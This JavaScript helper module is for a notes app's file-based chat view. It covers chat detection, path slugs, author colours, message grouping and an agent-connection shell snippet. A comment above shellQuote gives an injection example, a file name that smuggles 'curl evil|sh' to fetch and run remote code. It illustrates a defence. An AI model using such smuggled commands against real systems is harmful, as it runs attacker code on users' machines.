// File-based chat — pure helpers, no React, no window. ChatView.jsx is a thin
// renderer over these.
//
// The chat itself is a note (backend/handlers/chat_markdown.go owns the
// format); this module only decides how the web UI names, colours, groups and
// polls it.

// isChatDoc mirrors the backend's IsChatNote: leading frontmatter with
// `mdnest-chat: true`. Same frontmatter grammar as isMarpDoc (marp.js).
export function isChatDoc(content) {
  if (typeof content !== 'string') return false;
  const m = content.match(/^\uFEFF?---\r?\n([\s\S]*?)\r?\n---[ \t]*(\r?\n|$)/);
  if (!m) return false;
  return /^mdnest-chat[ \t]*:[ \t]*["']?true["']?[ \t]*$/im.test(m[1]);
}

// Poll cadence. The chat view does not depend on the live-collab websocket
// (off by default, multi mode only), so polling is the one mechanism that
// works on every install. Reads are cheap: `after=N` returns only new posts.
export const CHAT_POLL_MS = 3000;
export const CHAT_LIST_POLL_MS = 15000;

// Consecutive messages from one author inside this window share a header,
// like every chat app — a run of short agent updates reads as one turn.
export const GROUP_WINDOW_MS = 5 * 60 * 1000;

// Default folder a new chat lands in, inside the chosen namespace.
export const DEFAULT_CHAT_FOLDER = 'Chats';

// slugify turns a channel name into a filename. Deliberately conservative
// (lowercase ascii, digits, dashes): the path is what agents get handed, so
// it should survive a shell and a URL without quoting.
export function slugify(title) {
  const s = String(title || '')
    .normalize('NFKD')
    .replace(/[̀-ͯ]/g, '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 60)
    .replace(/-+$/g, '');
  return s || 'chat';
}

// chatPathFor builds the note path for a new chat: <folder>/<slug>.md.
export function chatPathFor(title, folder = DEFAULT_CHAT_FOLDER) {
  const dir = String(folder || '').replace(/^\/+|\/+$/g, '');
  const file = `${slugify(title)}.md`;
  return dir ? `${dir}/${file}` : file;
}

// Author colours are theme tokens, never literals (theme-tokens.test.js), so
// a name keeps a readable colour in both light and dark mode.
export const AUTHOR_COLORS = ['--accent', '--success', '--orange', '--pink', '--purple', '--info', '--lavender', '--warning'];

// colorForAuthor is stable per name: the same agent is the same colour in
// every chat and after every reload.
export function colorForAuthor(name) {
  let h = 0;
  for (const ch of String(name || '')) h = (h * 31 + ch.codePointAt(0)) >>> 0;
  return AUTHOR_COLORS[h % AUTHOR_COLORS.length];
}

// isOwnMessage: was this posted by me, under the name I am posting as now?
// `account` is my login (multi mode; null in single mode) and `postingAs` the
// label on my posts. The server writes a label that differs from the account
// as "label (via account)", so an agent running on my token as `claude-a` is
// NOT me — it renders on the other side, as its own voice.
export function isOwnMessage(msg, account, postingAs) {
  if (!msg || !postingAs) return false;
  const expectedVia = account && postingAs !== account ? account : '';
  return msg.author === postingAs && (msg.via || '') === expectedVia;
}

// groupMessages marks which messages start a new visual group.
export function groupMessages(messages) {
  let prev = null;
  return (messages || []).map((m) => {
    const t = Date.parse(m.time);
    const startsGroup = !prev
      || prev.author !== m.author
      || prev.via !== m.via
      || !(t - Date.parse(prev.time) <= GROUP_WINDOW_MS);
    prev = m;
    return { ...m, startsGroup };
  });
}

// mergeMessages appends a polled batch without duplicating anything already
// shown (a poll and a just-sent post can both deliver the same #N).
export function mergeMessages(current, incoming) {
  const seen = new Set((current || []).map((m) => m.n));
  const add = (incoming || []).filter((m) => !seen.has(m.n));
  if (add.length === 0) return current || [];
  return [...(current || []), ...add].sort((a, b) => a.n - b.n);
}

// plainPreview flattens a message for the one-line list preview: the list
// shows text, not rendered markdown, so the emphasis/code markers would
// otherwise appear literally ("**Shipping**").
export function plainPreview(text) {
  return String(text || '')
    .replace(/```[\s\S]*?(```|$)/g, ' [code] ')
    .replace(/!\[[^\]]*\]\([^)]*\)/g, '[image]')
    .replace(/\[([^\]]*)\]\([^)]*\)/g, '$1')
    .replace(/[*_`~#>]+/g, '')
    .replace(/\s+/g, ' ')
    .trim();
}

// formatChatTime: time only for today, date + time otherwise.
export function formatChatTime(iso, now = new Date()) {
  const d = new Date(iso);
  if (Number.isNaN(d.getTime())) return '';
  const time = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  if (d.toDateString() === now.toDateString()) return time;
  return `${d.toLocaleDateString([], { day: 'numeric', month: 'short' })} ${time}`;
}

// shellQuote single-quotes a word unless it is made only of characters no
// shell gives meaning to. A chat path is chosen by whoever created the note,
// which in a shared workspace is not the person pasting the snippet, so a
// name like `x;curl evil|sh;.md` must reach the shell as one inert word.
export function shellQuote(word) {
  const w = String(word);
  if (/^[A-Za-z0-9@%+=:,./_-]+$/.test(w)) return w;
  return `'${w.replace(/'/g, `'\\''`)}'`;
}

// The shell snippet shown in a chat's "Connect an agent" panel. It must be
// pasteable as-is (pasteable-commands.test.js): no <angle-bracket> stand-ins,
// and the target is quoted whenever it needs to be.
export function agentInstructions(alias, ns, path) {
  const target = shellQuote(`${alias ? `@${alias}/` : ''}${ns}/${path}`);
  return [
    `mdnest chat read ${target}`,
    `mdnest chat post ${target} "hello from my agent" --as my-agent`,
    `mdnest chat wait ${target} --after 1`,
  ].join('\n');
}
